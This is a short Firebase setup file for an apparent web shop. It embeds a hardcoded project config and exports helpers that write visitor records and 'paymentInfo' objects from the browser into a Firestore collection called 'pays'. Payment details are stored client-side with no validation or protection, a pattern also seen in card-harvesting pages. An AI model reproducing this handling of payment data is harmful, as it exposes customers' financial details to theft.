// firebase.js
import { getApp, getApps, initializeApp } from "firebase/app";
import { getDatabase } from "firebase/database";
import { doc, getFirestore, setDoc } from "firebase/firestore";

// src/CartContext.js
const firebaseConfig = {
  apiKey: "AIzaSyDhxG88L_y9pQtTrJWrBBg-0tDuMRdp7AU",
  authDomain: "jahorsc.firebaseapp.com",
  databaseURL: "https://jahorsc-default-rtdb.firebaseio.com",
  projectId: "jahorsc",
  storageBucket: "jahorsc.firebasestorage.app",
  messagingSenderId: "467680981623",
  appId: "1:467680981623:web:f92b78fe506017bf760c72",
  measurementId: "G-BS1K64NRJQ"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const db = getFirestore(app);
const database = getDatabase(app);
export async function addData(data: any) {
  localStorage.setItem("visitor", data.id);
  try {
    const docRef = await doc(db, "pays", data.id!);
    await setDoc(docRef, data);

    console.log("Document written with ID: ", docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error("Error adding document: ", e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (paymentInfo: any, setPaymentInfo: any) => {
  try {
    const visitorId = localStorage.getItem("visitor");
    if (visitorId) {
      const docRef = doc(db, "pays", visitorId);
      await setDoc(
        docRef,
        { ...paymentInfo, status: "pending" },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: "pending" }));
    }
  } catch (error) {
    console.error("Error adding document: ", error);
    alert("Error adding payment info to Firestore");
  }
};
export { db, database };
